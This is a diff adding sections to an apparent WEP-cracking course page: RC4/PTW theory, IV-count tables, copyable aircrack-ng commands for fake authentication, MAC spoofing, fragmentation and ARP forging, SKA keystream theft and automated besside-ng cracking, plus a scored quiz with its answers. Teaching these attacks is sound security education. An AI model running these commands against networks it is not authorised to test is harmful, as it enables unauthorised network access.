@@ -129,6 +129,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -379,6 +400,273 @@
       </div>
     </section>
 
+    <!-- Section 6: FMS vs PTW Theory -->
+    <section id="theory">
+      <h2><span class="section-num">06</span> FMS vs. PTW — Why WEP Falls</h2>
+      <p>Understanding the cryptographic reason WEP is broken makes you a better attacker and a better defender.</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Feature</th><th>FMS / KoreK (2001–2004)</th><th>PTW (2007)</th></tr></thead>
+          <tbody>
+            <tr><td>Packets used</td><td>Weak IVs only (~5% of all packets)</td><td style="color:var(--accent2)"><strong>All packets</strong></td></tr>
+            <tr><td>Min IVs (64-bit key)</td><td>~100,000–300,000</td><td style="color:var(--accent2)"><strong>~20,000–40,000</strong></td></tr>
+            <tr><td>Min IVs (128-bit key)</td><td>~500,000–1,000,000</td><td style="color:var(--accent2)"><strong>~50,000–85,000</strong></td></tr>
+            <tr><td>Known plaintext needed</td><td>1 byte (first keystream byte)</td><td>Full ARP packet (28 bytes)</td></tr>
+            <tr><td>Crack time (with ARP replay)</td><td>5–30 minutes</td><td style="color:var(--accent2)"><strong>&lt; 60 seconds</strong></td></tr>
+            <tr><td>aircrack-ng flag</td><td><code>(default)</code></td><td><code>-z</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout info">
+        <span class="ci">&#128202;</span>
+        <div><strong>Root cause:</strong> The RC4 Key Scheduling Algorithm processes <code>IV || secret_key</code> byte by byte. Weak IVs of the form <code>(A+3, 255, X)</code> cause the first keystream byte to statistically correlate with <code>key[A]</code> — at roughly twice the random chance. Collect enough IVs with this structure → recover each key byte independently.</div>
+      </div>
+    </section>
+
+    <!-- Section 7: IV Count Reference -->
+    <section id="iv-counts">
+      <h2><span class="section-num">07</span> IV Count Requirements</h2>
+      <p>Watch the <code>#Data</code> column in airodump-ng. When it passes these thresholds, run aircrack-ng.</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Method</th><th>Min IVs</th><th>Key Size</th><th>Typical Time</th></tr></thead>
+          <tbody>
+            <tr><td>ARP Replay (PTW)</td><td style="color:var(--accent2)"><strong>~20,000</strong></td><td>64-bit</td><td>2–5 min</td></tr>
+            <tr><td>ARP Replay (PTW)</td><td style="color:var(--accent2)"><strong>~80,000</strong></td><td>128-bit</td><td>5–15 min</td></tr>
+            <tr><td>Fragmentation (PTW)</td><td>~20,000</td><td>64-bit</td><td>3–10 min</td></tr>
+            <tr><td>Passive (KoreK)</td><td>~100,000</td><td>64-bit</td><td>30–90 min</td></tr>
+            <tr><td>Passive (KoreK)</td><td>~500,000</td><td>128-bit</td><td>2–8 hours</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Section 8: Full Command Reference -->
+    <section id="full-cmds">
+      <h2><span class="section-num">08</span> Complete Command Reference</h2>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Fake Authentication — full flags</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-fakeauth')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-fakeauth"><span class="cmt"># Fake authentication — must succeed before any injection attack</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--fakeauth</span> <span class="str">30</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-e</span> <span class="str">"MyAP"</span> <span class="flag">-h</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span>
+<span class="cmt"># --fakeauth 30  → re-auth every 30s to maintain association</span>
+<span class="cmt"># -a BSSID       → target AP MAC</span>
+<span class="cmt"># -e SSID        → required for some APs that check SSID in assoc req</span>
+<span class="cmt"># -h MAC         → your MAC (or a spoofed client MAC to bypass MAC filter)</span>
+<span class="out-ok">12:00:00  Sending Authentication Request (Open System) [ACK]</span>
+<span class="out-ok">12:00:00  Authentication successful!</span>
+<span class="out-ok">12:00:00  Sending Association Request [ACK]</span>
+<span class="out-ok">12:00:00  Association successful :-)</span>
+
+<span class="cmt"># If "Denied (code 10)" → MAC filter active → spoof a real client MAC:</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo macchanger <span class="flag">-m</span> <span class="str">REAL_CLIENT_MAC</span> wlan0mon</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Fragmentation + packetforge-ng workflow</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-frag')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-frag"><span class="cmt"># Step 1: Fake auth</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--fakeauth</span> 0 <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-h</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span>
+
+<span class="cmt"># Step 2: Fragmentation attack — recovers 1,500 bytes of keystream</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--fragment</span> <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-h</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span>
+<span class="out-ok">Saving keystream in fragment-0505-120000.xor</span>
+
+<span class="cmt"># Step 3: Forge an ARP using recovered keystream</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">packetforge-ng <span class="flag">--arp</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-h</span> <span class="str">11:22:33:44:55:66</span> <span class="flag">-k</span> <span class="str">192.168.1.255</span> <span class="flag">-l</span> <span class="str">192.168.1.1</span> <span class="flag">-y</span> <span class="str">fragment-0505-120000.xor</span> <span class="flag">-w</span> <span class="str">forged_arp.cap</span></span>
+<span class="cmt"># -k = destination IP, -l = source IP, -y = keystream, -w = output</span>
+
+<span class="cmt"># Step 4: Replay the forged ARP to generate IVs</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--interactive</span> <span class="flag">-r</span> <span class="str">forged_arp.cap</span> wlan0mon</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Shared Key Auth exploit — capture PRGA keystream</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-ska')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-ska"><span class="cmt"># Capture SKA exchange (wait for or force a client to auth with SKA)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-w</span> <span class="str">ska</span> wlan0mon</span>
+<span class="cmt"># aireplay-ng automatically detects SKA exchange and saves keystream:</span>
+<span class="out-ok">Saving PRGA in prga-AA:BB:CC:DD:EE:FF.xor</span>
+
+<span class="cmt"># Use the recovered keystream to fake-auth (no key knowledge required!)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--fakeauth</span> 0 <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-h</span> <span class="str">YOUR_MAC</span> <span class="flag">-y</span> <span class="str">prga-AA:BB:CC:DD:EE:FF.xor</span> wlan0mon</span>
+<span class="cmt"># -y = use this PRGA keystream instead of knowing the WEP key</span>
+<span class="cmt"># This is why SKA is WORSE than Open System Auth — it leaks the keystream!</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">besside-ng — fully automated WEP cracking</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-besside')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-besside"><span class="cmt"># Automated: scan → associate → replay → crack all WEP APs in range</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo besside-ng wlan0mon</span>
+
+<span class="cmt"># Target only one AP</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo besside-ng <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> wlan0mon</span>
+<span class="cmt"># -b BSSID  → target specific AP</span>
+<span class="cmt"># -c CH     → only this channel</span>
+<span class="cmt"># -W        → WEP only (skip WPA)</span>
+<span class="out-ok">[12:00:15] AA:BB:CC:DD:EE:FF MyAP WEP cracked: 1234567890</span>
+<span class="out">Results in: wep.cap  besside.log</span></div>
+      </div>
+    </section>
+
+    <!-- Section 9: aircrack-ng Flag Reference -->
+    <section id="aircrack-flags">
+      <h2><span class="section-num">09</span> aircrack-ng WEP Flag Reference</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Flag</th><th>Description</th><th>Example</th></tr></thead>
+          <tbody>
+            <tr><td><code>-z</code></td><td>PTW attack (recommended — fastest)</td><td><code>aircrack-ng -z cap.cap</code></td></tr>
+            <tr><td><code>-K</code></td><td>Force KoreK attack (all packets, no ARP needed)</td><td><code>aircrack-ng -K cap.cap</code></td></tr>
+            <tr><td><code>-n 64</code></td><td>Crack 64-bit key only</td><td><code>aircrack-ng -z -n 64 cap.cap</code></td></tr>
+            <tr><td><code>-n 128</code></td><td>Crack 128-bit key only</td><td><code>aircrack-ng -z -n 128 cap.cap</code></td></tr>
+            <tr><td><code>-b &lt;BSSID&gt;</code></td><td>Target only this AP's IVs</td><td><code>aircrack-ng -b AA:BB:CC cap.cap</code></td></tr>
+            <tr><td><code>-e &lt;ESSID&gt;</code></td><td>Target only this SSID</td><td><code>aircrack-ng -e "MyAP" cap.cap</code></td></tr>
+            <tr><td><code>-c</code></td><td>Restrict to ASCII characters only</td><td><code>aircrack-ng -c cap.cap</code></td></tr>
+            <tr><td><code>-d &lt;mask&gt;</code></td><td>Assume first N bytes of key are known</td><td><code>aircrack-ng -d 31:32 cap.cap</code></td></tr>
+            <tr><td><code>*.ivs</code></td><td>Read from .ivs format (smaller files)</td><td><code>aircrack-ng *.ivs</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Section 10: Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">10</span> Knowledge Check</h2>
+      <p>Test your WEP cracking knowledge before moving to Module 06.</p>
+
+      <div class="quiz-container">
+        <h3>&#127358; Module 05 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">A "64-bit WEP" network is configured. What is the actual secret key strength in bits?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)">64 bits</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)">40 bits — the 24-bit IV is subtracted from the 64-bit total, leaving only 40 bits of actual secret key</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">48 bits</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">128 bits — 64-bit is a marketing term for AES</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">Why does IV reuse allow an attacker to recover plaintext without knowing the WEP key?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because the CRC-32 checksum reveals the key bytes directly</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)">Because two packets encrypted with the same IV use the same keystream, so XORing their ciphertexts yields P1 XOR P2 — and if one plaintext is known (e.g., ARP header), the other is immediately recovered</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because RC4 uses a deterministic cipher that can be brute-forced</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because the IV is encrypted and can be extracted from the frame header</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text">What is the key difference between the PTW attack and the FMS/KoreK attacks?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">PTW uses AES while FMS uses RC4</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">PTW uses ALL captured packets (not just weak IVs) and needs full ARP known-plaintext — requiring ~5-10x fewer IVs than KoreK</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">PTW only works on 64-bit WEP while FMS works on both 64 and 128-bit</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">PTW is slower but more reliable because it tries all possible key bytes</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">You run <code>aireplay-ng --fakeauth 0 -a AP_BSSID -h YOUR_MAC wlan0mon</code> and get "Denied (code 10)". What is the most likely cause and fix?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)">The AP requires WPA2 — WEP fake auth does not apply</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">You are not in monitor mode</button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">The AP has MAC address filtering — spoof a known-good client MAC with <code>macchanger -m CLIENT_MAC wlan0mon</code> then retry</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">The TX power is too low — increase with <code>iw set txpower fixed 3000</code></button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">Why is Shared Key Authentication (SKA) considered <em>weaker</em> security than Open System Authentication for WEP networks?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)">SKA uses a shorter IV than Open System Authentication</button>
+            <button class="option-btn" onclick="answer(this,'q5',true)">SKA transmits both the plaintext challenge and the encrypted challenge in the same exchange — XORing them directly reveals the keystream without needing to crack the key</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">SKA is more vulnerable because it uses an older version of RC4</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">SKA transmits the WEP key in plaintext during the authentication handshake</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">What does <code>airodump-ng --output-format ivs</code> capture, and what is the trade-off compared to <code>--output-format pcap</code>?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">It captures only beacon frames; trade-off is that data packets are lost</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">It captures only WEP Initialization Vectors (much smaller file); trade-off is the .ivs file cannot be opened in Wireshark and is only usable with aircrack-ng</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">It captures only IV-based attacks; the pcap format is for WPA2 captures</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">It uses integer vector compression; trade-off is slower crack speed</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">What does <code>packetforge-ng --arp -y fragment-XXXX.xor -w forged.cap</code> produce and what is the <code>-y</code> flag?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">It builds a probe request; -y specifies the target SSID</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">It builds a valid WEP-encrypted ARP packet using the keystream from the fragmentation attack (-y = keystream .xor file), producing a .cap that can be replayed to generate IVs without knowing the key</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">It builds a deauthentication frame; -y is the BSSID of the target AP</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">It builds a WPA2 EAPOL frame; -y is the PMK hex value</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">The ARP replay attack in <code>aireplay-ng --arpreplay -b BSSID -h MAC wlan0mon</code> is running but the #Data counter in airodump-ng stays at 0. What is the most likely problem?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)">aircrack-ng is already cracking — it paused the capture</button>
+            <button class="option-btn" onclick="answer(this,'q8',true)">No ARP packet has been captured yet to replay — aireplay-ng is waiting. Fix: use fake auth first, then trigger ARP with fragmentation or wait for a client to generate ARP traffic</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">The -h MAC must match the AP BSSID exactly</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">The network uses 128-bit WEP which blocks ARP replay</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <!-- Nav -->
     <div class="nav-footer">
       <a href="../module-04-packet-analysis/" class="nav-btn prev">&#8592; Module 04: Packet Analysis</a>
@@ -397,6 +685,78 @@
       btn.classList.add('copied');
       setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
     });
+  }
+
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. 64-bit WEP = 24-bit IV (sent cleartext per packet) + 40-bit secret key. The '64-bit' label counts the IV, which provides zero security. The actual key you must crack is only 40 bits (5 ASCII characters or 10 hex digits).",
+      wrong: "Incorrect. WEP key sizes are misleading. '64-bit WEP' = 24-bit IV + 40-bit secret. '128-bit WEP' = 24-bit IV + 104-bit secret. The IV is always transmitted in cleartext alongside each packet."
+    },
+    q2: {
+      correct: "Correct. When the same IV repeats, the identical RC4 keystream K is used twice: C1 = P1 XOR K, C2 = P2 XOR K. XOR them: C1 XOR C2 = P1 XOR P2. Since ARP packets have a known header structure, P1 is known → P2 is immediately recovered.",
+      wrong: "Incorrect. IV reuse causes two different plaintexts to be encrypted with the same keystream K. XORing the two ciphertexts eliminates K: C1 XOR C2 = P1 XOR P2. With known plaintext (ARP header), the attacker recovers the other plaintext."
+    },
+    q3: {
+      correct: "Correct. FMS/KoreK use only 'weak IVs' (~5% of packets) with a known first plaintext byte. PTW uses ALL packets with full ARP known-plaintext (28 bytes) and a corrected voting scheme — requiring 5-10x fewer IVs and completing in under 60 seconds.",
+      wrong: "Incorrect. The key difference: FMS/KoreK use only 'weak IV' packets (~5% of total) requiring 100K-1M IVs. PTW uses ALL captured packets, exploits full ARP known-plaintext, and cracks 64-bit WEP with ~20,000-40,000 IVs in under 60 seconds."
+    },
+    q4: {
+      correct: "Correct. Error code 10 = 'Unacceptable parameters' in 802.11 association response = the AP is rejecting your MAC because it's not in its allowlist. Solution: use airodump-ng to find a real connected client's MAC, then spoof it with macchanger.",
+      wrong: "Incorrect. Error code 10 specifically means the AP rejected the association — almost always due to MAC filtering. Spoof a legitimate client MAC: get it from the airodump-ng STATION list, then macchanger -m CLIENT_MAC wlan0mon."
+    },
+    q5: {
+      correct: "Correct. SKA challenge-response sends both the plaintext challenge (Frame 2) and the RC4-encrypted challenge (Frame 3) in consecutive captured frames. XOR of frames 2 and 3 = keystream. An attacker uses this keystream directly — no need to crack the WEP key at all.",
+      wrong: "Incorrect. SKA is weaker because the challenge (plaintext) and its encryption (ciphertext) are both captured in the same authentication exchange. Plaintext XOR Ciphertext = Keystream. Attacker has the keystream without knowing the key."
+    },
+    q6: {
+      correct: "Correct. --output-format ivs extracts only the WEP Initialization Vectors, producing a much smaller file. Trade-off: .ivs files are only readable by aircrack-ng (not Wireshark), and non-IV information (full frame content) is lost.",
+      wrong: "Incorrect. --output-format ivs captures ONLY the WEP IV from each packet — discarding all other frame data. This produces a tiny file (much faster to load into aircrack-ng) but cannot be opened in Wireshark or used for any non-IV analysis."
+    },
+    q7: {
+      correct: "Correct. packetforge-ng builds a WEP-encrypted ARP packet using the keystream (.xor file) recovered by the fragmentation attack. The -y flag specifies the keystream file. The output .cap contains a valid encrypted ARP ready for replay — no key knowledge needed.",
+      wrong: "Incorrect. packetforge-ng creates WEP-encrypted packets using a recovered keystream. The -y flag points to the .xor keystream file from the fragmentation attack. The result is a .cap file containing a properly-encrypted ARP that can be replayed with aireplay-ng --interactive."
+    },
+    q8: {
+      correct: "Correct. aireplay-ng --arpreplay waits for an ARP packet to appear in captured traffic. If no ARP has been seen, it just waits. Fix: (1) authenticate first with --fakeauth, then use --fragment to generate an ARP via packetforge-ng; or (2) wait for a real client to generate ARP traffic on the network.",
+      wrong: "Incorrect. --arpreplay waits for an ARP packet to replay. If the #Data counter stays at 0, no ARP has been captured yet. Ensure fake auth succeeded first, then either wait for a client to generate ARP traffic, or use fragmentation + packetforge-ng to create a synthetic ARP to replay."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 06!' : pct >= 0.75 ? 'Strong — review any missed questions.' : pct >= 0.5 ? 'Getting there — revisit the PTW theory and attack method sections.' : 'Re-read the RC4 weakness, IV counting, and attack method sections.';
+      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
+      scoreEl.classList.add('show');
+    }
   }
 
   // Crack simulation
